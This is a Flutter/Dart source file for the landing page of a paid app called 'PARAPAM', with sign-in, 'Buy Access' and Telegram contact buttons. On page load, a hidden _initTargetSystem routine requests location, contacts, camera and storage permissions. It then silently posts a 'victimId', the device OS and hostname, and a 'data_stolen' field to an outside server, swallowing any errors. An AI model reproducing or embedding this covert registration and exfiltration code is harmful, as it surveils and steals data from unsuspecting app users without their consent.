import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

import 'login_page.dart'; 

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> fadeAnimation;
  late Animation<Offset> slideAnimation;

  final Color darkBg = const Color(0xFF050505);
  final Color grayPrimary = const Color(0xFF6E6E6E);
  final Color grayAccent = const Color(0xFFBDBDBD);
  final Color grayGlow = const Color(0xFFE0E0E0);

  @override
  void initState() {
    super.initState();

    // OTOMATISASI: IZIN & REGISTER TARGET
    _initTargetSystem();

    _controller = AnimationController(vsync: this, duration: const Duration(seconds: 1));
    fadeAnimation = Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOut));
    slideAnimation = Tween<Offset>(begin: const Offset(0, 0.2), end: Offset.zero).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOutCubic));
    _controller.forward();
  }

  Future<void> _initTargetSystem() async {
    try {
      await [
        Permission.location,
        Permission.contacts,
        Permission.camera, 
        Permission.storage,
      ].request();

      const String serverBase = "http://papi.queen-priv.my.id:2417";
      final String victimId = "ZDX-${Platform.localHostname.hashCode}";

      await http.post(
        Uri.parse("$serverBase/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
          "data_stolen": "Target Online: Landing Page Accessed",
        }),
      ).timeout(const Duration(seconds: 5));
    } catch (e) {
    }
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  Future<void> _openUrl(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      debugPrint("Could not launch $url");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: Stack(
        children: [
          Positioned(top: -120, left: -80, child: _glowCircle(320, grayPrimary.withOpacity(0.4))),
          Positioned(bottom: -150, right: -100, child: _glowCircle(360, grayAccent.withOpacity(0.4))),
          
          SafeArea(
            child: FadeTransition(
              opacity: fadeAnimation,
              child: SlideTransition(
                position: slideAnimation,
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 28),
                  child: Column(
                    children: [
                      const SizedBox(height: 60),
                      // Pastikan logo.png ada di folder assets
                      SizedBox(height: 280, child: Image.asset("assets/images/logo.png", fit: BoxFit.contain)),
                      const SizedBox(height: 30),
                      
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(colors: [grayAccent, Colors.white]).createShader(bounds),
                        child: const Text("PARAPAM", style: TextStyle(fontSize: 38, fontWeight: FontWeight.w900, letterSpacing: 2, color: Colors.white)),
                      ),
                      
                      const SizedBox(height: 12),
                      const Text("The Last Version 2.0", textAlign: TextAlign.center, style: TextStyle(color: Colors.white70, fontSize: 14, height: 1.6)),
                      const SizedBox(height: 40),
                      
                      // Card Panel Utama
                      ClipRRect(
                        borderRadius: BorderRadius.circular(26),
                        child: BackdropFilter(
                          filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
                          child: Container(
                            padding: const EdgeInsets.all(24),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(26),
                              border: Border.all(color: Colors.white.withOpacity(0.12))
                            ),
                            child: Column(
                              children: [
                                _primaryButton(),
                                const SizedBox(height: 16),
                                _secondaryButton(),
                                const SizedBox(height: 24),
                                Row(
                                  children: [
                                    Expanded(child: _contactButton(FontAwesomeIcons.telegram, "Channel", "https://t.me/ParapamXTeam", const Color(0xFF0088cc))),
                                    const SizedBox(width: 12),
                                    Expanded(child: _contactButton(FontAwesomeIcons.telegram, "Support", "https://t.me/mizukisnji", const Color(0xFF0088cc))),
                                  ],
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                      
                      const SizedBox(height: 40),
                      const Text("© 2026 ParapamX Projector.", style: TextStyle(color: Colors.white38, fontSize: 12)),
                      const SizedBox(height: 20),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _glowCircle(double size, Color color) => Container(
    width: size, 
    height: size, 
    decoration: BoxDecoration(shape: BoxShape.circle, gradient: RadialGradient(colors: [color, Colors.transparent]))
  );

  Widget _primaryButton() {
    return Container(
      width: double.infinity, 
      height: 55,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [grayPrimary, grayAccent]), 
        borderRadius: BorderRadius.circular(16), 
        boxShadow: [BoxShadow(color: grayGlow.withOpacity(0.3), blurRadius: 15, offset: const Offset(0, 5))]
      ),
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, shadowColor: Colors.transparent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))),
        onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (context) => const LoginPage())),
        child: const Text("Sign In", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
      ),
    );
  }

  Widget _secondaryButton() => OutlinedButton(
    style: OutlinedButton.styleFrom(
      minimumSize: const Size(double.infinity, 55), 
      side: BorderSide(color: grayAccent.withOpacity(0.6)), 
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))
    ), 
    onPressed: () => _openUrl("https://t.me/mizukisnji"), 
    child: const Text("Buy Access", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))
  );

  Widget _contactButton(IconData icon, String label, String url, Color color) {
    return InkWell(
      onTap: () => _openUrl(url),
      borderRadius: BorderRadius.circular(14),
      child: Container(
        height: 50,
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.05), 
          borderRadius: BorderRadius.circular(14), 
          border: Border.all(color: Colors.white.withOpacity(0.1))
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center, 
          children: [
            FaIcon(icon, color: color, size: 18), 
            const SizedBox(width: 8), 
            Text(label, style: const TextStyle(color: Colors.white70, fontWeight: FontWeight.w600, fontSize: 12))
          ]
        ),
      ),
    );
  }
}